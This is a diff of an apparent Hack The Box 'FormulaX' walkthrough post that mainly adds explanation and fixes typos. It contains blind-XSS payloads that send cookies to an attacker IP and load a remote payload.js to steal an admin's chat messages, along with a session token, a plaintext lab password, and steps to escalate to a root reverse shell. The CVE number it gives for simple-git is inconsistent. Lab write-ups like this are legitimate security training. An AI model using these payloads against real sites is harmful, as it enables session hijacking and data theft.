@@ -5,13 +5,21 @@ tags:
   - htb
   - linux
   - hard
+  - chatbot
+  - blind-xss
+  - xss
+  - cve-2022-24439
+  - mongodb
+  - chisel
+  - librenms
+  - sudoers
 ---
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/FormulaX.png)
 
 ## Information Gathering
 ### Rustscan
 
-Rustscan discovers SSH and HTTP open:
+Rustscan discovers **SSH** and **HTTP** open:
 
 `rustscan --addresses 10.10.11.6 --range 1-65535`
 
@@ -21,7 +29,7 @@ Rustscan discovers SSH and HTTP open:
 ## Enumeration
 ### HTTP - TCP 80
 
-The website is a Chatbot and it requires login:
+The website is a **Chatbot** and it requires login:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image.png)
 
@@ -37,24 +45,33 @@ After login, we are provided with the Chatting feature:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-3.png)
 
-sudo feroxbuster -u http://10.10.11.6 -n -x html -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404
+Let's first see if there are any interesting hidden directories:
+
+`sudo feroxbuster -u http://10.10.11.6 -n -x html -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -C 404`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-8.png)
 
+`/admin` looks interesting but we would need admin credentials to login.
+
+Inspecting the web browser, we see there's a cookie value stored:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-14.png)
 
-Bearer%20eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NjYwMTFiZmE2NWFiNDUxNDlhYWZkZmUiLCJpYXQiOjE3MTc1NzIwMzh9.nYOIolfX9Iv3vmVoua9R-Zvp9BRTMkTuko740dC0fnc
+Let's try directory bruteforcing with the cookie value specified:
 
 `gobuster dir -u http://10.10.11.6 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c "Bearer%20eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NjYwMTFiZmE2NWFiNDUxNDlhYWZkZmUiLCJpYXQiOjE3MTc1NzIwMzh9.nYOIolfX9Iv3vmVoua9R-Zvp9BRTMkTuko740dC0fnc" 
 `
+Unfortunately, it found nothing interesting. 
 
-This looks very simiar to ChatGPT:
+Let's move on and take a look at the Chatting function.
+
+This looks very similar to ChatGPT:
 
 `http://10.10.11.6/restricted/chat.html`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-4.png)
 
-Currently, services is broken, and it says only in-built commands are useable:
+Currently, services is broken, and it says only in-built commands are usable:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-5.png)
 
@@ -79,7 +96,7 @@ Let's take a look at the contact page:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-9.png)
 
-We tried sending random data and this form seemed to be active:
+We tried sending random data and this form seems to be active:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-10.png)
 
@@ -95,7 +112,7 @@ On our Python server, we can see connections being made:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-13.png)
 
-We have tried cookie stealing but it wasn't successful:
+We have tried cookie stealing as well but it wasn't successful:
 
 `<img src=x onerror="document.location='http://10.10.14.36:1234/?cookie=' + document.cookie"/>`
 
@@ -237,23 +254,23 @@ script.addEventListener('load',function(){
 });
 ```
 
+With our Python server running with **payload.js**, let's run the following XSS command that will download payload.js and execute it:
 
 `<img src=x onerror="var script1=document.createElement('script'); script1.src='http://10.10.14.36:4444/payload.js';document.head.appendChild(script1);"/>`
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-18.png)
 
+As we send the message, **payload.js** is executed on admin user's browser and returns the messages from it:
+
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-19.png)
 
-
-
-
-```
-R3JlZXRpbmdzIS4gSG93IGNhbiBpIGhlbHAgeW91IHRvZGF5ID8uIFlvdSBjYW4gdHlwZSBoZWxwIHRvIHNlZSBzb21lIGJ1aWxkaW4gY29tbWFuZHM=SGVsbG8sIEkgYW0gQWRtaW4uVGVzdGluZyB0aGUgQ2hhdCBBcHBsaWNhdGlvbg==V3JpdGUgYSBzY3JpcHQgZm9yICBkZXYtZ2l0LWF1dG8tdXBkYXRlLmNoYXRib3QuaHRiIHRvIHdvcmsgcHJvcGVybHk=V3JpdGUgYSBzY3JpcHQgdG8gYXV0b21hdGUgdGhlIGF1dG8tdXBkYXRlTWVzc2FnZSBTZW50Ojxicj5oaXN0b3J5
-```
+Let's organize the messages in base64 and decode it:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-20.png)
 
-**dev-git-auto-update.chatbot.htb** /etc/hosts
+Message reveals a subdomain **dev-git-auto-update.chatbot.htb**  which we add to `/etc/hosts`.
+
+**dev-git-auto-update.chatbot.htb** is a Git Auto Report Generator:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-21.png)
 
@@ -267,7 +284,6 @@ At the bottom of the page, we see the software running: **simple-git v3.14**
 Researching a bit about this version, it seems to be vulnerable to **CVE-2022-24066**:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-22.png)
-
 
 From [here](https://github.com/gitpython-developers/GitPython/issues/1515), we found a usable payload.
 
@@ -289,7 +305,7 @@ It shows the same error when executed:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-24.png)
 
-However, our Python web server receives incoming conenction from the web app, meaning it is vulnerble to RCE:
+However, our Python web server receives incoming connection from the web app, meaning it is vulnerable to RCE:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-25.png)
 
@@ -356,7 +372,7 @@ Let's take a look into **testing** database:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-37.png)
 
-`db.users.find()` command revelas password hashes for user **admin** and **frank_dorky**
+`db.users.find()` command reveals password hashes for user **admin** and **frank_dorky**
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-38.png)
 
@@ -434,8 +450,6 @@ Now we are able to login to dashboard as the newly created admin user:
 
 Using **Create New Template** feature, we should be able to spawn a reverse shell as the root. But before spawning a shell, we need to change some of the misconfigurations.
 
-
-
 On `/validate`, we can see that server is having DNS issue:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-50.png)
@@ -464,7 +478,7 @@ As soon as we create a new template, we get a reverse shell connection on our ne
 
 ## Privesc: librenms to kai_relay
 
-Reverse shell is spawned inside `/opt/librenms` directory:
+Reverse shell was spawned inside `/opt/librenms` directory:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-56.png)
 
@@ -472,8 +486,7 @@ Looking at files inside the current directory, `.custom.env` file stands out to 
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-55.png)
 
-`.custom.env` files reveals the username and password for kai_relay -> **kai_relay: mychemicalformulaX**
-
+`.custom.env` files reveals the username and password for **kai_relay: mychemicalformulaX**
 
 `cat .custom.env`
 
@@ -481,14 +494,13 @@ Looking at files inside the current directory, `.custom.env` file stands out to 
 
 Luckily, we are able to use the found credentials for SSH login:
 
-
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-58.png)
 
 
 ## Privesc: kai_relay to root
 ### Sudoers
 
-Let's see what commands could be ran with sudo privilge through the command `sudo -l`:
+Let's see what commands could be ran with sudo privilege through the command `sudo -l`:
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-59.png)
 
@@ -522,9 +534,15 @@ With both the exploit and shell.sh prepared on the system, let's run `/usr/bin/o
 
 ![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-61.png)
 
+Now that port 2022 is open, let's run the exploit towards it:
 
+`python3 exploit.py --host 127.0.0.1 --port 2002`
 
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-62.png)
 
+As the exploit runs, `shell.sh` inside is also executed and we get reverse shell as the root:
+
+![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/formulax/image-63.png)
 
 
 ## References
